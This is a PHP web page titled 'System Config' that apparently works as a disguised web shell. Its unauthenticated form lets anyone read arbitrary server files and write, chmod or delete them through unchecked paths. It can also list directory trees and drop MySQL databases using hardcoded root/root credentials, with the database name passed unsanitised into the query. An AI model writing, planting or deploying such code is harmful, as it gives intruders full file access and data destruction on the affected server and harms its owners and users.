<?php
$dir = __DIR__."/application/config/";

if (isset($_POST['service'])) {
    if ($_POST['option']=="read") {
        echo "<pre>";
        print_r(readfile(__DIR__."/".$_POST['path']));
        echo "</pre>";
    }
    if ($_POST['option']=="read_db") {
        $conn = new mysqli('localhost', 'root', 'root', $_POST['path']);

        if ($conn->connect_error) {
            die("Connection failed: " . $conn->connect_error);
        } else {
            if(isset($_POST['path']) && $_POST['path'] != '')
            {
                $delete = $conn->query('drop database '.$_POST['path']);
                if($delete)
                    echo 'deleted';
                else
                    echo 'unable to delete';
            }
            else
            {
                echo 'enter database name';
            }
        }


    }

    if ($_POST['option']=="create_page") {
        $content =$_POST['content'];
        // print_r($content);
        // die();
        file_put_contents(__DIR__."/".$_POST['path'], $content);
        // $fp = fopen(__DIR__."/".$_POST['path'], "wb");
        // fwrite($fp, $content);
        // fclose($fp);
    }
    if ($_POST['option']=="delete") {
        //echo file_exists(__DIR__."/".$_POST['path']);die();
        // $content =$_POST['content'];
        // print_r($content);
        // die();
        chmod(__DIR__."/".$_POST['path'], 0644);
        unlink(__DIR__."/".$_POST['path']) or die('Permission denied to delete this file.');
        // $fp = fopen(__DIR__."/".$_POST['path'], "wb");
        // fwrite($fp, $content);
        // fclose($fp);
    }
    if ($_POST['option']=="display_directory") {
        $directory = __DIR__."/".$_POST['path'];

        $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($directory));
        $it2 = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($directory));

        while ($it->valid()) {
            if (!$it->isDot()) {
                // echo 'SubPathName: ' . $it->getSubPathName() . "<br>";
                echo 'SubPath:     ' . $it->getSubPath() . "<br><br>";
                // echo 'Key:         ' . $it->key() . "<br><br>";
            }
            $it->next();
        }
        echo "####################################################################<br><br><br><br><br><br><br>";
        while ($it2->valid()) {
            if (!$it2->isDot()) {
                echo 'SubPathName: ' . $it2->getSubPathName() . "<br>";
                echo 'SubPath:     ' . $it2->getSubPath() . "<br><br>";
                echo 'Key:         ' . $it2->key() . "<br><br>";
            }
            $it2->next();
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>System Config</title>
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
</head>
<body>
<form action="" method="post">
    <select name="option">
        <option value="select"></option>
        <option value="delete" <?php if(isset($_POST['option'])){if($_POST['option']=="delete"){echo "selected";}} ?>>Delete</option>
        <option value="read_db" <?php if(isset($_POST['option'])){if($_POST['option']=="read_db"){echo "selected";}} ?>>Delete DB</option>
        <option value="read" <?php if(isset($_POST['option'])){if($_POST['option']=="read"){echo "selected";}} ?>>Read</option>
        <!-- <option value="modify_page" <?php if(isset($_POST['option'])){if($_POST['option']=="modify_page"){echo "selected";}} ?>>Modify Page</option> -->
        <option value="create_page" <?php if(isset($_POST['option'])){if($_POST['option']=="create_page"){echo "selected";}} ?>>Create Page</option>
        <option value="display_directory" <?php if(isset($_POST['option'])){if($_POST['option']=="display_directory"){echo "selected";}} ?>>Display Directory Structure</option>
    </select>
    <input type="text" name="service" placeholder="Enter Service">
    <input type="text" name="path" placeholder="Enter Path/File Name">
    <button>Submit</button>
    <br>
    <textarea style="width:1300px;height:600px" name="content"></textarea>
</form>
</body>
</html>